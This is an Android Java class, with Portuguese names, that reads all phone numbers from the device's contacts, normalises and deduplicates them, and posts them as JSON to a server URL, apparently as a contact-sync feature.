package project.myapplication;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class clsContatos {


    //region Métodos

    public void AtualizarContatos(ContentResolver contentResolver, String url) {
        String phoneNumber;
        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
        StringBuffer output = new StringBuffer();

        List<String> arrayNumeros = new ArrayList<>();

        Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null, null);

        if (cursor.getCount() > 0) {

            while (cursor.moveToNext()) {

                String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));

                if (hasPhoneNumber > 0) {

                    output.append("\n First Name:" + name);
                    final String finalName = name;

                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);
                    while (phoneCursor.moveToNext()) {

                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                        output.append("\n Phone number:" + phoneNumber);

                        final String finalPhoneNumber = ((phoneNumber.replace("-","")).replace("*","")).replace("+55","");
                        if (finalPhoneNumber.length() > 8) {
                            arrayNumeros.add(finalPhoneNumber);
                        }
                    }

                    phoneCursor.close();
                }
                output.append("\n");
            }

            Set<String> stringSet = new HashSet<>();
            stringSet.addAll(arrayNumeros);
            arrayNumeros.clear();
            arrayNumeros.addAll(stringSet);

            JSONObject jsonObject = new JSONObject();
            JSONArray jsonArray = new JSONArray();
            try {
                for (int i = 0; i < arrayNumeros.size(); i ++) {
                    JSONObject aux = new JSONObject();
                    aux.put("nr_telefone", arrayNumeros.get(i));
                    jsonArray.put(aux);
                }

            jsonObject.put("numeros", jsonArray);

                clsUtil util = new clsUtil();
                util.enviarServidor(url,jsonObject.toString(),"send-json");

            } catch (JSONException e) {
                e.printStackTrace(); // Erro JSON
            } catch (InterruptedException e) {
                e.printStackTrace(); // Erro enviar servidor
            }

        }

    }
    //endregion
}
